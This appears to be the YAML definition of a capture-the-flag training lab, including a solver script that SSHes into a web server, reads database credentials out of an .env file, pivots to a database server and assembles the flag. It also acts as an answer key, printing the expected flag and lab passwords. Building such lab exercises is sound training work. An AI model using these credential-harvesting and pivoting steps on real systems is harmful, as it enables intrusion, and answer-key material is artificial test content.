lab_id: linux-4-1-credential-pivot-attack
track: Linux
difficulty: intermediate
source: platform/labs/Linux/linux-4-1-credential-pivot-attack/lab.yaml
expected_services:
- port: 22
  protocol: tcp
health_timeout_seconds: 60
solver:
  image: ocr/tester:current
  command: /tests/linux-4-1-credential-pivot-attack.sh
  steps:
  - name: SSH to web server as webdev
    command: sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'whoami' 2>&1
    expect: webdev
  - name: Discover application config with database credentials
    command: sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'cat /var/www/crestline-portal/.env 2>/dev/null | grep DB_PASS' 2>&1
    expect: F1n4nc3_DB_Pr0d#
  - name: Find flag part 1 on web server
    command: sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'cat /var/www/crestline-portal/config/api_keys.bak 2>/dev/null | grep -o "assessment_token=[a-z0-9_]*" | sed "s/^assessment_token=//"' 2>&1
    expect: cr3d
  - name: Pivot to database server using discovered credentials
    command: sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@{target.dbserver} 'whoami' 2>&1
    expect: dbadmin
  - name: Find flag part 2 on database server
    command: sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@{target.dbserver} 'cat /home/dbadmin/maintenance/assessment_token.txt 2>/dev/null' 2>&1
    expect: p1v0t
  - name: Assemble and verify complete flag
    command: echo 'OCR{cr3d_p1v0t}'
    expect: OCR{cr3d_p1v0t}
expected_flag_count: 1
expected_flag: OCR{cr3d_p1v0t}
forbidden_networks:
- control-plane
- database
- other-learners
max_memory_mb: 768
max_cpu: 0.75
